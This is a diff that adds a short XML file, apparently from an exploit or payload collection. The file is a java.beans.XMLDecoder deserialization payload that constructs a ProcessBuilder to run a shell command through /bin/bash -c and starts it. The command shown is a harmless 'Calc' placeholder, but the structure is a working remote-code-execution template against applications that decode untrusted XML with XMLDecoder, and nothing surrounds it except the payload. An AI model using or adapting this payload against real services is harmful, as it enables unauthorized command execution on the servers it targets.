@@ -1,0 +1,15 @@
+<java version="1.4.0" class="java.beans.XMLDecoder">
+    <void class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="3">
+            <void index="0">
+                <string>/bin/bash</string>
+            </void>
+            <void index="1">
+                <string>-c</string>
+            </void>
+            <void index="2">
+                <string>Calc</string>
+            </void>
+        </array>
+        <void method="start"/></void>
+</java>
